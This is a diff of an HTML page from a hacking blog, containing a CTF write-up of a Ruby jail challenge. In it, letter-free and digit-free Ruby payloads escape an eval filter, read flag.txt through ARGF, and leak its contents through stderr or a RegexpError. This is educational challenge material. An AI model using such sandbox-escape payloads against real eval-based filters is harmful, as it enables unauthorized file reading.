@@ -16,7 +16,9 @@
   <link rel="stylesheet" href="/css/font.css"/>
   <link rel="stylesheet" href="/css/smigle.css"/>
   
-  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+ <link rel="stylesheet" href="/css/syntax.css">
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
   <link rel="manifest" href="/site.webmanifest">
@@ -29,14 +31,14 @@
     <div id="root">
       <header>
   <div id="brand">
-    <a class="icon-link" href="https://salvatore-abello.github.io/">
+    <a class="icon-link" href="https://blog.babelo.xyz/">
       <img
         class="icon"
         src="/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"
       />
     </a>
     <div class="text">
-      <a href="https://salvatore-abello.github.io/"><h1>Salvatore Abello&#39;s Blog</h1></a>
+      <a href="https://blog.babelo.xyz/"><h1>Salvatore Abello&#39;s Blog</h1></a>
       <h3>Hacking &amp; other stuff</h3>
     </div>
   </div>
@@ -124,19 +126,19 @@
   </a>
 </h2>
 <p>We&rsquo;re given a single file called <code>chall.rb</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span><span style="color:#66d9ef">STDOUT</span><span style="color:#f92672">.</span>sync <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">STDOUT</span><span style="color:#f92672">.</span>class<span style="color:#f92672">.</span>send(<span style="color:#e6db74">:remove_method</span>, <span style="color:#e6db74">:&lt;&lt;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;safe code &gt; &#34;</span>
-</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> gets<span style="color:#f92672">.</span>chomp
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> code <span style="color:#f92672">=~</span> <span style="color:#e6db74">/[\w?&#39;&#34;`]/</span>
-</span></span><span style="display:flex;"><span>  puts <span style="color:#e6db74">&#34;not safe&#34;</span>
-</span></span><span style="display:flex;"><span>  exit <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">&#34;ok&#34;</span>
-</span></span><span style="display:flex;"><span>eval code
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rb" data-lang="rb"><span class="line"><span class="cl"><span class="no">STDOUT</span><span class="o">.</span><span class="n">sync</span> <span class="o">=</span> <span class="kp">true</span>
+</span></span><span class="line"><span class="cl"><span class="no">STDOUT</span><span class="o">.</span><span class="n">class</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="ss">:remove_method</span><span class="p">,</span> <span class="ss">:&lt;&lt;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s2">&#34;safe code &gt; &#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="nb">gets</span><span class="o">.</span><span class="n">chomp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">code</span> <span class="o">=~</span> <span class="sr">/[\w?&#39;&#34;`]/</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">puts</span> <span class="s2">&#34;not safe&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">exit</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;ok&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="n">code</span>
 </span></span></code></pre></div><p>There&rsquo;s not much going on, the only restriction is the regex <code>/[\w?'&quot;`]/</code>:</p>
 <ul>
 <li><code>[...]</code> - Match a single character present in the list below</li>
@@ -302,51 +304,51 @@ Also, the <code>&lt;&lt;</code> method of <code>STDOUT</code> is disabled so it&
   </a>
 </h2>
 <p>From the previous ruby jail I learned that it&rsquo;s not required to use quotes to create strings by using this payload</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>A<span style="color:#f92672">=</span><span style="color:#e6db74">%&lt;&gt;</span>       <span style="color:#75715e"># creates an empty string</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?f</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?l</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?a</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?g</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?.</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?t</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?x</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">?t</span>
-</span></span><span style="display:flex;"><span>p A         <span style="color:#75715e"># it will print flag.txt</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rb" data-lang="rb"><span class="line"><span class="cl"><span class="n">A</span><span class="o">=</span><span class="sx">%&lt;&gt;</span>       <span class="c1"># creates an empty string</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="sc">?f</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="sc">?l</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="sc">?a</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="sc">?g</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="sc">?.</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="sc">?t</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="sc">?x</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="sc">?t</span>
+</span></span><span class="line"><span class="cl"><span class="nb">p</span> <span class="n">A</span>         <span class="c1"># it will print flag.txt</span>
 </span></span></code></pre></div><p>The previous syntax is allowed in ruby but not in our case.
 Another way to build strings from scratch is the following</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>A<span style="color:#f92672">=</span><span style="color:#e6db74">%&lt;&gt;</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">102</span>          <span style="color:#75715e"># f</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">108</span>          <span style="color:#75715e"># l</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">97</span>           <span style="color:#75715e"># a</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">103</span>          <span style="color:#75715e"># g</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">46</span>           <span style="color:#75715e"># .</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">116</span>          <span style="color:#75715e"># t</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">120</span>          <span style="color:#75715e"># x</span>
-</span></span><span style="display:flex;"><span>A<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">116</span>          <span style="color:#75715e"># t</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rb" data-lang="rb"><span class="line"><span class="cl"><span class="n">A</span><span class="o">=</span><span class="sx">%&lt;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="mi">102</span>          <span class="c1"># f</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="mi">108</span>          <span class="c1"># l</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="mi">97</span>           <span class="c1"># a</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="mi">103</span>          <span class="c1"># g</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="mi">46</span>           <span class="c1"># .</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="mi">116</span>          <span class="c1"># t</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="mi">120</span>          <span class="c1"># x</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="o">&lt;&lt;</span><span class="mi">116</span>          <span class="c1"># t</span>
 </span></span></code></pre></div><p>Since we can&rsquo;t even use numbers, we need to find a way to &ldquo;build&rdquo; them.</p>
 <p>I found out that ruby golf cheatsheets contain useful information to solve ruby jail challenges.
 By default, ruby has some special global variables. A list of them can be found <a href="https://medium.com/ruby-golf/ruby-golf-cheatsheet-eb27ec2cdf60#Special%20variables">here</a>.</p>
 <p>A variable that is useful in this case is <code>$.</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$.   <span style="color:#75715e"># The current line number of the last file from input.</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rb" data-lang="rb"><span class="line"><span class="cl"><span class="vg">$.</span>   <span class="c1"># The current line number of the last file from input.</span>
 </span></span></code></pre></div><p>After taking our input, this variable will always contains <code>1</code>. We also need a way to store strings without using letters. By fuzzing I found out the variable $, can do so:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$,   <span style="color:#75715e"># The output field separator for the print and Array#join.  Defaults to nil.</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rb" data-lang="rb"><span class="line"><span class="cl"><span class="vg">$,</span>   <span class="c1"># The output field separator for the print and Array#join.  Defaults to nil.</span>
 </span></span></code></pre></div><p>With that in mind, I created a simple function to solve our problem:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">to_num</span>(f):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;+&#39;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;$.&#39;</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(f)) <span style="color:#66d9ef">if</span> f <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;$.-$.&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,=%&lt;&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">102</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">108</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">97</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">103</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">46</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">116</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">120</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,&lt;&lt;</span><span style="color:#e6db74">{</span>to_num(<span style="color:#ae81ff">116</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">to_num</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;+&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;$.&#39;</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">f</span><span class="p">))</span> <span class="k">if</span> <span class="n">f</span> <span class="k">else</span> <span class="s1">&#39;$.-$.&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">$,=%&lt;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">$,&lt;&lt;</span><span class="si">{</span><span class="n">to_num</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">$,&lt;&lt;</span><span class="si">{</span><span class="n">to_num</span><span class="p">(</span><span class="mi">108</span><span class="p">)</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">$,&lt;&lt;</span><span class="si">{</span><span class="n">to_num</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">$,&lt;&lt;</span><span class="si">{</span><span class="n">to_num</span><span class="p">(</span><span class="mi">103</span><span class="p">)</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">$,&lt;&lt;</span><span class="si">{</span><span class="n">to_num</span><span class="p">(</span><span class="mi">46</span><span class="p">)</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">$,&lt;&lt;</span><span class="si">{</span><span class="n">to_num</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">$,&lt;&lt;</span><span class="si">{</span><span class="n">to_num</span><span class="p">(</span><span class="mi">120</span><span class="p">)</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">$,&lt;&lt;</span><span class="si">{</span><span class="n">to_num</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="p">)</span>
 </span></span></code></pre></div><div class="notice note" >
     <p class="notice-title">
         <span class="icon-notice baseline">
@@ -368,10 +370,10 @@ In order to read files we can use <a href="https://ruby-doc.org/core-2.5.1/ARGF.
 p *$&lt;               # Print the content of &#34;flag.txt&#34;
 </code></pre><p>Note that <code>ARGF</code> operates on the file names inside <code>ARGV</code>.
 Since we can&rsquo;t print the flag to stdout, we can leak it in this way:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>open(open(<span style="color:#e6db74">&#34;flag.txt&#34;</span>)<span style="color:#f92672">.</span>read()) <span style="color:#75715e"># We need an equivalent payload in ruby</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span> <span class="c1"># We need an equivalent payload in ruby</span>
 </span></span></code></pre></div><p>I noticed that <code>$:</code> (which is the equivalent of <code>$LOAD_PATH</code>) might be useful for us. Although $: is read-only, you can replace its elements to store strings (or any value).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$: <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;test&#34;</span>         <span style="color:#75715e"># not allowed</span>
-</span></span><span style="display:flex;"><span>$:<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;test&#34;</span>      <span style="color:#75715e"># allowed</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rb" data-lang="rb"><span class="line"><span class="cl"><span class="vg">$:</span> <span class="o">=</span> <span class="s2">&#34;test&#34;</span>         <span class="c1"># not allowed</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$:</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="s2">&#34;test&#34;</span>      <span class="c1"># allowed</span>
 </span></span></code></pre></div><p>Now we have everything to write a working payload which will leak the content of <code>flag.txt.</code></p>
 
 <h1 id="solve">
@@ -379,19 +381,19 @@ Since we can&rsquo;t print the flag to stdout, we can leak it in this way:</p>
     Solve
   </a>
 </h1>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$,<span style="color:#f92672">=</span><span style="color:#e6db74">%&lt;&gt;</span>                  
-</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">102</span>                 <span style="color:#75715e"># f</span>
-</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">108</span>                 <span style="color:#75715e"># l</span>
-</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">97</span>                  <span style="color:#75715e"># a</span>
-</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">103</span>                 <span style="color:#75715e"># g</span>
-</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">46</span>                  <span style="color:#75715e"># .</span>
-</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">116</span>                 <span style="color:#75715e"># t</span>
-</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">120</span>                 <span style="color:#75715e"># x</span>
-</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">116</span>                 <span style="color:#75715e"># t</span>
-</span></span><span style="display:flex;"><span>$*<span style="color:#f92672">&lt;&lt;</span>$,                  <span style="color:#75715e"># ARGV -&gt; [&#34;flag.txt&#34;]</span>
-</span></span><span style="display:flex;"><span>$:<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]=*</span>$&lt;               <span style="color:#75715e"># read &#34;flag.txt&#34; and put it inside $: at index 0</span>
-</span></span><span style="display:flex;"><span>$*<span style="color:#f92672">&lt;&lt;</span>$:<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">][</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>            <span style="color:#75715e"># Put the content of flag.txt inside ARGV</span>
-</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">=*</span>$&lt;                  <span style="color:#75715e"># print the flag to stderr</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rb" data-lang="rb"><span class="line"><span class="cl"><span class="vg">$,</span><span class="o">=</span><span class="sx">%&lt;&gt;</span>                  
+</span></span><span class="line"><span class="cl"><span class="vg">$,</span><span class="o">&lt;&lt;</span><span class="mi">102</span>                 <span class="c1"># f</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$,</span><span class="o">&lt;&lt;</span><span class="mi">108</span>                 <span class="c1"># l</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$,</span><span class="o">&lt;&lt;</span><span class="mi">97</span>                  <span class="c1"># a</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$,</span><span class="o">&lt;&lt;</span><span class="mi">103</span>                 <span class="c1"># g</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$,</span><span class="o">&lt;&lt;</span><span class="mi">46</span>                  <span class="c1"># .</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$,</span><span class="o">&lt;&lt;</span><span class="mi">116</span>                 <span class="c1"># t</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$,</span><span class="o">&lt;&lt;</span><span class="mi">120</span>                 <span class="c1"># x</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$,</span><span class="o">&lt;&lt;</span><span class="mi">116</span>                 <span class="c1"># t</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$*</span><span class="o">&lt;&lt;</span><span class="vg">$,</span>                  <span class="c1"># ARGV -&gt; [&#34;flag.txt&#34;]</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$:</span><span class="o">[</span><span class="mi">0</span><span class="o">]=*</span><span class="vg">$&lt;</span>               <span class="c1"># read &#34;flag.txt&#34; and put it inside $: at index 0</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$*</span><span class="o">&lt;&lt;</span><span class="vg">$:</span><span class="o">[</span><span class="mi">0</span><span class="o">][</span><span class="mi">0</span><span class="o">]</span>            <span class="c1"># Put the content of flag.txt inside ARGV</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$,</span><span class="o">=*</span><span class="vg">$&lt;</span>                  <span class="c1"># print the flag to stderr</span>
 </span></span></code></pre></div><p>Let&rsquo;s break it down</p>
 <ul>
 <li><code>$,=%&lt;&gt;</code> creates an empty string</li>
@@ -417,19 +419,19 @@ Since we can&rsquo;t print the flag to stdout, we can leak it in this way:</p>
 </h1>
 <p>A revenge challenge has also been released where there&rsquo;s a limit of 35 characters to our input. A shorter payload could be made by reading from STDIN the flag path.
 By doing so, the payload becomes (32 characters):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$*<span style="color:#f92672">.</span>&lt;&lt;(<span style="color:#f92672">*</span>$&lt;) <span style="color:#75715e"># read from stdin</span>
-</span></span><span style="display:flex;"><span>$*<span style="color:#f92672">.</span>&lt;&lt;(<span style="color:#f92672">*</span>$&lt;) <span style="color:#75715e"># read from flag.txt</span>
-</span></span><span style="display:flex;"><span>$*<span style="color:#f92672">.</span>&lt;&lt;(<span style="color:#f92672">*</span>$&lt;) <span style="color:#75715e"># leak the flag</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rb" data-lang="rb"><span class="line"><span class="cl"><span class="vg">$*</span><span class="o">.</span><span class="n">&lt;&lt;</span><span class="p">(</span><span class="o">*</span><span class="vg">$&lt;</span><span class="p">)</span> <span class="c1"># read from stdin</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$*</span><span class="o">.</span><span class="n">&lt;&lt;</span><span class="p">(</span><span class="o">*</span><span class="vg">$&lt;</span><span class="p">)</span> <span class="c1"># read from flag.txt</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$*</span><span class="o">.</span><span class="n">&lt;&lt;</span><span class="p">(</span><span class="o">*</span><span class="vg">$&lt;</span><span class="p">)</span> <span class="c1"># leak the flag</span>
 </span></span></code></pre></div><p>A shorter version (28 characters) of this payload would be</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$*<span style="color:#f92672">.</span>&lt;&lt;(<span style="color:#f92672">*</span>$&lt;) <span style="color:#75715e"># read from stdin the flag path</span>
-</span></span><span style="display:flex;"><span>$*<span style="color:#f92672">.</span>&lt;&lt;(<span style="color:#f92672">*</span>$&lt;) <span style="color:#75715e"># read from flag.txt</span>
-</span></span><span style="display:flex;"><span>$,<span style="color:#f92672">=*</span>$&lt;     <span style="color:#75715e"># leak the flag</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rb" data-lang="rb"><span class="line"><span class="cl"><span class="vg">$*</span><span class="o">.</span><span class="n">&lt;&lt;</span><span class="p">(</span><span class="o">*</span><span class="vg">$&lt;</span><span class="p">)</span> <span class="c1"># read from stdin the flag path</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$*</span><span class="o">.</span><span class="n">&lt;&lt;</span><span class="p">(</span><span class="o">*</span><span class="vg">$&lt;</span><span class="p">)</span> <span class="c1"># read from flag.txt</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$,</span><span class="o">=*</span><span class="vg">$&lt;</span>     <span class="c1"># leak the flag</span>
 </span></span></code></pre></div><p>And here&rsquo;s a much shorter version (25 characters)(credits to @lydxn)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$*<span style="color:#f92672">.</span>&lt;&lt;(<span style="color:#f92672">*</span>$&lt;)      <span style="color:#75715e"># read from stdin the flag path</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">/</span><span style="color:#e6db74">#{</span><span style="color:#f92672">[*</span>$&lt;<span style="color:#f92672">]*</span>$/<span style="color:#e6db74">}</span><span style="color:#e6db74">(/</span>  <span style="color:#75715e"># leak the flag by throwing a RegexpError</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rb" data-lang="rb"><span class="line"><span class="cl"><span class="vg">$*</span><span class="o">.</span><span class="n">&lt;&lt;</span><span class="p">(</span><span class="o">*</span><span class="vg">$&lt;</span><span class="p">)</span>      <span class="c1"># read from stdin the flag path</span>
+</span></span><span class="line"><span class="cl"><span class="sr">/</span><span class="si">#{</span><span class="o">[*</span><span class="vg">$&lt;</span><span class="o">]*</span><span class="vg">$/</span><span class="si">}</span><span class="sr">(/</span>  <span class="c1"># leak the flag by throwing a RegexpError</span>
 </span></span></code></pre></div><p>The previous payload could be shortened to 22 characters</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>$*<span style="color:#f92672">.</span>&lt;&lt;(<span style="color:#f92672">*</span>$&lt;)
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">/</span><span style="color:#e6db74">#{</span><span style="color:#f92672">[*</span>$&lt;<span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">(/</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rb" data-lang="rb"><span class="line"><span class="cl"><span class="vg">$*</span><span class="o">.</span><span class="n">&lt;&lt;</span><span class="p">(</span><span class="o">*</span><span class="vg">$&lt;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="sr">/</span><span class="si">#{</span><span class="o">[*</span><span class="vg">$&lt;</span><span class="o">]</span><span class="si">}</span><span class="sr">(/</span>
 </span></span></code></pre></div><p>In order to make these payloads work, you have to close stdin from further reading. You can do that by pressing <code>CTRL+D</code> but it only works locally.
 Since you can&rsquo;t directly send <code>CTRL+D</code> to the remote server, you can use <code>remote.shutdown</code> (Thanks to @lydxn).
